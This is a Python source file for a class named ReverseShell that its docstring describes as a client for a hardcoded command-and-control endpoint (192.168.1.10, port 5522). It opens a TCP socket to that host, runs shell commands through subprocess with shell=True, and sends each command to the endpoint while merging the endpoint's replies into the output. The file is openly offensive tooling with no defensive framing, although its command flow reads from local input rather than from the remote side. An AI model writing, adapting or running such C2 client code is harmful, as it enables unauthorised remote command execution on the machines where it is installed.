import socket
import os
import subprocess

__all__ = ["ReverseShell"]


class ReverseShell:
    """Python reverse shell client for a hardcoded Linux C2 endpoint."""

    C2_HOST = "192.168.1.10"
    C2_PORT = 5522
    CHUNK_SIZE = 4096

    def __init__(self, host=None, port=None, timeout=0.5):
        self.host = host if host is not None else self.C2_HOST
        self.port = port if port is not None else self.C2_PORT
        self.timeout = timeout
        self.sock = None
        self.connected = False
        self._stdin_buffer = b""

    def connect(self):
        if self.sock is not None:
            try:
                self.sock.close()
            except OSError:
                pass
            self.sock = None

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(self.timeout)
        self.sock.connect((self.host, self.port))
        self.connected = True
        return self.sock

    def close(self):
        if self.sock is not None:
            try:
                self.sock.close()
            except OSError:
                pass
        self.sock = None
        self.connected = False

    def _ensure_connected(self):
        if not self.connected:
            self.connect()

    def send_command(self, command):
        self._ensure_connected()
        payload = str(command).encode("utf-8", "replace")
        if not payload.endswith(b"\n"):
            payload += b"\n"
        try:
            self.sock.sendall(payload)
        except OSError:
            self.connected = False
            raise
        return payload

    def receive_output(self):
        self._ensure_connected()
        chunks = []
        try:
            while True:
                chunk = self.sock.recv(self.CHUNK_SIZE)
                if not chunk:
                    break
                chunks.append(chunk)
        except socket.timeout:
            pass
        except OSError:
            self.connected = False
        return b"".join(chunks).decode("utf-8", "replace")

    def execute_command(self, command):
        proc = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            close_fds=True,
        )
        stdout, _ = proc.communicate()
        return stdout.decode("utf-8", "replace"), proc.returncode

    def _readline(self):
        while b"\n" not in self._stdin_buffer:
            try:
                chunk = os.read(0, self.CHUNK_SIZE)
            except OSError:
                chunk = b""
            if not chunk:
                break
            self._stdin_buffer += chunk

        if not self._stdin_buffer:
            return None

        if b"\n" in self._stdin_buffer:
            line, self._stdin_buffer = self._stdin_buffer.split(b"\n", 1)
        else:
            line = self._stdin_buffer
            self._stdin_buffer = b""

        return line.decode("utf-8", "replace") if line else None

    def _write_stdout(self, text):
        data = text.encode("utf-8", "replace")
        while data:
            written = os.write(1, data)
            if written <= 0:
                break
            data = data[written:]

    def _write_stderr(self, text):
        data = text.encode("utf-8", "replace")
        while data:
            written = os.write(2, data)
            if written <= 0:
                break
            data = data[written:]

    def run(self):
        try:
            self.connect()
        except OSError as exc:
            self._write_stderr(
                "warning: C2 connection failed for {}:{}: {}\n".format(
                    self.host, self.port, exc
                )
            )
            self.close()
            self.connected = False

        while True:
            line = self._readline()
            if line is None:
                break

            command = line.strip()
            if not command:
                continue

            if command.lower() in ("exit", "quit", "bye"):
                break

            try:
                output, _ = self.execute_command(command)
            except Exception as exc:
                output = "error: {}\n".format(exc)

            if self.connected:
                try:
                    self.send_command(command)
                    remote_output = self.receive_output()
                    if remote_output:
                        output = "{}{}".format(output, remote_output)
                except OSError:
                    self.connected = False

            if output:
                self._write_stdout(output)


if __name__ == "__main__":
    ReverseShell().run()
